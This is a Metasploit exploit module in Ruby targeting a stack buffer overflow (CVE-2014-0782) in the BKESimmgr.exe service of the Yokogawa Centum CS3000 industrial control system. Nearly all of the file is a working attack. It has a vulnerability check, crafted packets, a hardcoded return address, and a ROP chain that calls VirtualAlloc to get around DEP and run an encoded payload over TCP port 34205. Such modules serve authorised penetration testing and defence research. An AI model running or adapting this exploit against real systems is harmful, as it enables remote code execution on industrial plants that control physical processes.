##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Yokogawa CS3000 BKESimmgr.exe Buffer Overflow',
      'Description'    => %q{
        This module exploits an stack based buffer overflow on Yokogawa CS3000. The vulnerability
        exists in the BKESimmgr.exe service when handling specially crafted packets, due to an
        insecure usage of memcpy, using attacker controlled data as the size count. This module
        has been tested successfully in Yokogawa CS3000 R3.08.50 over Windows XP SP3 and Windows
        2003 SP2.
      },
      'Author'         =>
        [
          'juan vazquez',
          'Redsadic <julian.vilas[at]gmail.com>'
        ],
      'References'     =>
        [
          ['CVE', '2014-0782'],
          ['URL', 'https://community.rapid7.com/community/metasploit/blog/2014/05/09/r7-2013-192-disclosure-yokogawa-centum-cs-3000-vulnerabilities'],
          ['URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf']
        ],
      'Payload'        =>
        {
          'Space'          => 340,
          'DisableNops'    => true,
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [
            'Yokogawa Centum CS3000 R3.08.50 / Windows [ XP SP3 / 2003 SP2 ]',
            {
              'Ret'           => 0x61d1274f, # 0x61d1274f # ADD ESP,10 # RETN # libbkebatchepa.dll
              'Offset'        => 64,
              'FakeArgument1' => 0x0040E65C, # ptr to .data on BKESimmgr.exe
              'FakeArgument2' => 0x0040EB90  # ptr to .data on BKESimmgr.exe
            }
          ],
        ],
      'DisclosureDate' => 'Mar 10 2014',
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(34205)
      ], self.class)
  end

  def check
    data = create_pkt(rand_text_alpha(4))

    res = send_pkt(data)

    if res && res.length == 10
      simmgr_res = parse_response(res)

      if valid_response?(simmgr_res)
        check_code = Exploit::CheckCode::Appears
      else
        check_code = Exploit::CheckCode::Safe
      end
    else
      check_code = Exploit::CheckCode::Safe
    end

    check_code
  end

  def exploit
    bof = rand_text(target['Offset'])
    bof << [target.ret].pack("V")
    bof << [target['FakeArgument1']].pack("V")
    bof << [target['FakeArgument2']].pack("V")
    bof << rand_text(16)  # padding (corrupted bytes)
    bof << create_rop_chain
    bof << payload.encoded

    data = [0x1].pack("N")         # Sub-operation id, <= 0x8 in order to pass the check at sub_4090B0
    data << [bof.length].pack("n")
    data << bof

    pkt = create_pkt(data)

    print_status("Trying target #{target.name}, sending #{pkt.length} bytes...")
    connect
    sock.put(pkt)
    disconnect
  end

  def create_rop_chain
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
      [
        0x004047ca, # POP ECX # RETN [BKESimmgr.exe]
        0x610e3024, # ptr to &VirtualAlloc() [IAT libbkfmtvrecinfo.dll]
        0x61232d60, # MOV EAX,DWORD PTR DS:[ECX] # RETN [LibBKESysVWinList.dll]
        0x61d19e6a, # XCHG EAX,ESI # RETN [libbkebatchepa.dll]
        0x619436d3, # POP EBP # RETN [libbkeeda.dll]
        0x61615424, # & push esp #  ret  [libbkeldc.dll]
        0x61e56c8e, # POP EBX # RETN [LibBKCCommon.dll]
        0x00000001, # 0x00000001-> ebx
        0x61910021, # POP EDX # ADD AL,0 # MOV EAX,6191002A # RETN [libbkeeda.dll]
        0x00001000, # 0x00001000-> edx
        0x0040765a, # POP ECX # RETN [BKESimmgr.exe]
        0x00000040, # 0x00000040-> ecx
        0x6191aaab, # POP EDI # RETN [libbkeeda.dll]
        0x61e58e04, # RETN (ROP NOP) [LibBKCCommon.dll]
        0x00405ffa, # POP EAX # RETN [BKESimmgr.exe]
        0x90909090, # nop
        0x619532eb  # PUSHAD # RETN [libbkeeda.dll]
      ].pack("V*")

    rop_gadgets
  end

  def create_pkt(data)
    pkt = [0x01].pack("N")         # Operation Identifier
    pkt << [data.length].pack("n") # length
    pkt << data                    # Fake packet

    pkt
  end

  def send_pkt(data)
    connect
    sock.put(data)
    res = sock.get_once
    disconnect

    res
  end

  def parse_response(data)
    data.unpack("NnN")
  end

  def valid_response?(data)
    valid = false

    if data && data[0] == 1 && data[1] == 4 && data[1] == 4 && data[2] == 5
      valid = true
    end

    valid
  end

end

